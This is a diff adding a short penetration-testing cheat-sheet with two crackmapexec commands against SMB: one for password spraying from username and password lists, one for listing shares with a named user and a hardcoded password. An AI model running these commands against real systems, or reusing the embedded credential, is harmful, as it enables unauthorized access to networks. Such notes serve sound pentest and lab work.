@@ -1,0 +1,7 @@
+### Password Spraying on SMB
+crackmapexec smb <IP> -u usernames.txt -p passwords.txt --continue-on-success
+
+### Listing shares when credentials are known
+crackmapexec smb <IP> -u john -p "dqsTwTpZPn#nL" --shares
+
+
